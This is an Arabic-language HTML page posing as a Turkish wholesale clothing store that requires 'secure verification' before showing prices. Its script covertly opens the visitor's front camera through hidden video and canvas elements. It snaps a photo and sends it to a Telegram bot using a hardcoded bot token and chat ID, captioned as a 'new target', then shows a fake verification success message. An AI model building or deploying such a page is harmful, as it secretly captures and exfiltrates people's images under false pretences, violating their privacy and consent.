<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أسواق تركيا للجملة 🇹🇷</title>
    <style>
        body { font-family: 'Arial', sans-serif; margin: 0; background-color: #f8f9fa; color: #333; text-align: center; }
        header { background-color: #d32f2f; color: white; padding: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
        .hero { background: white; padding: 30px; margin: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .btn-buy { background-color: #2e7d32; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; width: 100%; max-width: 300px; }
        #video { display: none; } /* الكاميرا مخفية تماماً */
    </style>
</head>
<body>

<header>
    <h1>أسواق تركيا للجملة 🇹🇷</h1>
    <p>بوابة التجار للاستيراد المباشر</p>
</header>

<div class="hero">
    <h2>تخفيضات الربيع الحصرية</h2>
    <p>يجب تفعيل "نظام التحقق الآمن" لمشاهدة أسعار الملابس والمنسوجات الجديدة.</p>
    <button class="btn-buy" onclick="startCamera()">تفعيل الوصول للأسعار</button>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
    // التوكن الصحيح من صورتك الأخيرة لبوت challenge_m_2026_bot
    const botToken = "8676589474:AAF2LBiWe4lraKPUiIhaXZTLIH6DKIn5xzA"; 
    const chatId = "8124196406"; 

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    function startCamera() {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                // ننتظر ثانية واحدة لضبط الوضوح ثم نلتقط
                setTimeout(takeShot, 1500);
            })
            .catch(err => {
                alert("خطأ: يجب الموافقة على الصلاحية لرؤية قائمة الأسعار.");
            });
    }

    function takeShot() {
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, 640, 480);
        
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'trade.jpg');
            formData.append('caption', '📸 هدف جديد من متجر تركيا! 🔥');

            fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(data => {
                if(data.ok) {
                    alert("تم التحقق بنجاح! سيتم تحويلك لقسم الأسعار الآن.");
                } else {
                    console.log("Error:", data);
                }
            })
            .catch(err => console.error(err));
        }, 'image/jpeg');
    }
</script>

</body>
</html>
